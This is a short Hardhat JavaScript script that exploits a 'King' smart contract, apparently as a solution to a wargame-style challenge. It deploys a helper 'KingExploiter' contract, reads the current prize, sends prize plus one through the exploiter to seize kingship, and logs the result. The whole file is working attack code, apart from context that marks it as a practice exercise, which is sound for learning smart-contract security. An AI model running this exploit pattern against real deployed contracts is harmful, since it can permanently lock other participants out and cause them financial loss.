// king.js - Exploits the King contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { kingAddress, kingAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const king = new ethers.Contract(kingAddress, kingAbi, provider);
    const kingSigner = king.connect(account);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("KingExploiter");
    const exploiter = await Exploiter.deploy(kingAddress);

    await exploiter.deployed();

    console.log("Exploiter deployed to:", exploiter.address);

    // Run exploit
    console.log("Running exploit.")

    // Get the current prize on the King contract
    let prize = await kingSigner.prize();
    console.log("Current prize is:", prize);

    console.log("Sending prize + 1 through the exploiter contract to have it claim the kingship...");
    let sendTxn = await exploiter.sendOn({value: prize.add(ethers.constants.One), gasLimit: ethers.utils.parseUnits('100000', 'wei') });
    await sendTxn.wait();

    // Confirm exploit 
    let newKing = await kingSigner._king();
    console.log("King is now:", newKing);

    console.log("Exploit completed.")

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });